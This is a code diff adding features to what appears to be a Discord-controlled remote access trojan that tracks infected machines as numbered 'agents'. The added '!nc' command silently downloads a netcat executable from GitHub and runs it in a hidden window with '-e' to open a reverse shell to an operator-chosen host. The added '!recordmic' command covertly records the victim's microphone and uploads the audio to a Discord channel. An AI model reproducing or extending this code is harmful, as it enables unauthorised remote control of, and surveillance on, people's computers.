@@ -6,6 +6,8 @@ import requests
 import random
 from cv2 import VideoCapture
 from cv2 import imwrite
+from scipy.io.wavfile import write
+from sounddevice import rec, wait
 import platform
 import re
 from urllib.request import Request, urlopen
@@ -443,6 +445,68 @@ async def location(context):
         except Exception as e:
             my_embed = discord.Embed(title=f"Error while getting location of Agent#{ID}:\n{e}", color=0xFF0000)
             await context.message.channel.send(embed=my_embed)
+
+@client.command(name='nc', pass_context=True)
+async def nc(context):
+    command = context.message.content.replace("!nc ", "")
+    word_list = command.split()
+    if os.path.exists(fr'C:\Users\{USERNAME}\.config\uploads\netcat.exe'):
+        try:
+            my_embed = discord.Embed(title=f"Running Netcat on Agent#{ID}", color=0x00FF00)
+            await context.message.channel.send(embed=my_embed)
+            result = sp.Popen(f"C:\\Users\\{USERNAME}\\.config\\uploads\\netcat.exe {word_list[1]} {word_list[2]} -e {word_list[3]}", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
+            out, err = result.communicate()
+            result.wait()
+            if err:
+                my_embed = discord.Embed(title=f"Error while running Netcat on Agent#{ID}:\n{err}", color=0xFF0000)
+                await context.message.channel.send(embed=my_embed)
+            else:
+                my_embed = discord.Embed(title=f"Netcat has been successfully executed on Agent#{ID}", color=0x00FF00)
+                await context.message.channel.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error while running Netcat on Agent#{ID}:\n{e}", color=0xFF0000)
+            await context.message.channel.send(embed=my_embed)
+    else:
+        try:
+            my_embed = discord.Embed(title=f"Downloading Netcat on Agent#{ID}", color=0x00FF00)
+            await context.message.channel.send(embed=my_embed)
+            r = requests.get("https://github.com/int0x33/nc.exe/raw/master/nc64.exe", allow_redirects=True, verify=False)
+            open(fr"C:\Users\{USERNAME}\.config\uploads\netcat.exe", 'wb').write(r.content)
+            my_embed = discord.Embed(title=f"Running Netcat on Agent#{ID}", color=0x00FF00)
+            await context.message.channel.send(embed=my_embed)
+            result = sp.Popen(f"C:\\Users\\{USERNAME}\\.config\\uploads\\netcat.exe {word_list[1]} {word_list[2]} -e {word_list[3]}", stderr=sp.PIPE, stdin=sp.DEVNULL, stdout=sp.PIPE, shell=True, text=True, creationflags=0x08000000)
+            out, err = result.communicate()
+            result.wait()
+            if err:
+                my_embed = discord.Embed(title=f"Error while running Netcat on Agent#{ID}:\n{err}", color=0xFF0000)
+                await context.message.channel.send(embed=my_embed)
+            else:
+                my_embed = discord.Embed(title=f"Netcat has been successfully executed on Agent#{ID}", color=0x00FF00)
+                await context.message.channel.send(embed=my_embed)
+        except Exception as e:
+            my_embed = discord.Embed(title=f"Error while running Netcat on Agent#{ID}:\n{e}", color=0xFF0000)
+            await context.message.channel.send(embed=my_embed)
+
+@client.command(name='recordmic', pass_context=True)
+async def recordmic(context):
+    command = context.message.content.replace("!recordmic ", "")
+    word_list = command.split()
+    seconds = int(word_list[1])
+    channel = client.get_channel(DOWNLOADS_ID)
+    try:
+        fs = 44100
+        recording = rec(int(seconds * fs), samplerate=fs, channels=2)
+        wait()
+        os.chdir(fr"C:\Users\{USERNAME}\.config\uploads")
+        write('recording.wav', fs, recording)
+        await channel.send(f"**Agent #{ID}** Microphone recording:", file=discord.File(fr"C:\Users\{USERNAME}\.config\uploads\recording.wav"))
+        os.remove(fr"C:\Users\{USERNAME}\.config\uploads\recording.wav")
+        my_embed = discord.Embed(title=f"The recorded audio has been uploaded to 'downloads' channel", color=0x00FF00)
+        await context.message.channel.send(embed=my_embed)
+    except Exception as e:
+        my_embed = discord.Embed(title=f"Error while recording mic on Agent#{ID}:\n{e}", color=0xFF0000)
+        await context.message.channel.send(embed=my_embed)
+
 
 @client.command(name='killproc',pass_context=True)
 async def killproc(context):
